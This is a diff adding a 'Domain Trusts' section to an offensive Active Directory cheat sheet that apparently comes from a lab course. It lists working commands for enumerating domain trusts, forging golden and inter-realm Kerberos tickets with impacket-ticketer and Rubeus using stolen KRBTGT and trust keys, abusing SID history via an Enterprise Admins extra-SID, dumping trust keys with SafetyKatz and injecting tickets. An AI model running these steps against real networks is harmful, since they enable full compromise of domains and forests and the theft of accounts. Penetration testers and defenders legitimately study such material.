@@ -55,6 +55,7 @@
   * <<ToSystem, ToSystem>>
 - <<amsi, AMSI>>
 - <<post-exploatation, post-exploatation>>
+- <<trust, Domain Trusts>>
 - <<stuck, Stucked>>
 
 [[overview]]
@@ -1791,6 +1792,68 @@ wireshark -r WS-01_PktMon.pcap
 
 You need to find moslty some auth packet to catch cleartext creds or hashes. It's working with all `.pcap` files 
 
+[[trust]]
+== Domain Trusts
+
+Enum
+
+check all domain trusts
+
+```bash
+nltest /domain_trusts
+```
+
+Verbose trust to target domain
+
+```bash
+Get-ADTrust -Identity target_domain | fl *
+```
+
+Bloodhound shows a `SameForestTrust` between domains this means that we can generate a ticket for other domain if we have one domain compromised 
+
+```bash
+impacket-ticketer  -aesKey '154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848' -domain-sid 'S-1-5-21-719815819-3726368948-3917688648' -domain 'DOLLARCORP.MONEYCORP.LOCAL' -extra-sid 'S-1-5-21-335606122-960912869-3279953914-519' Administrator
+```
+
+Note
+
+`-aesKey` it's a *aes256* key of `KRBTGT` user in compromised domain
+`-extra-sid ` it's a `Enterprise Admins` SID in target domain
+
+`CrossForestTrust` between domain check if `Spoof SID History` is blocked , `TGT Delegation` is disabled
+
+From enum part check 
+
+
+`SIDFilteringForestAware : ?`     *False* - SIDHistory attack (PrivEsc) between domains
+
+`SIDFilteringQuarantined : ?`     *False* - SIDHistory attack (PrivEsc) between domains
+
+`TGTDelegation :           ?`     *True* - compromise account with delegation rights -> Impersonation
+
+`SelectiveAuthentication:  ?`     *False* - All users can log in to target domain from trusted domain
+
+`Direction              :  ?`     *BiDirectional* Two-Way trust compromise domain A attack B 
+
+Extract trust key between domains 
+
+```bash
+SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
+```
+
+look in compromised -> target and search `rc4_hmac_nt` 
+
+```bash
+Rubeus.exe -args evasive-silver /service:krbtgt/compromised_domain /rc4:163373571e6c000000000000060accdf0 /sid:sid_compromised_domain /ldap /user:Administrator /nowrap
+```
+
+If not works try specify /ldaps + /domain
+
+Returns `base64(ticket.kirbi)` 
+
+```bash
+Rubeus.exe -args asktgs /service:cifs/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket:output_of_ticket_base64
+```
 
 
 [[stuck]]
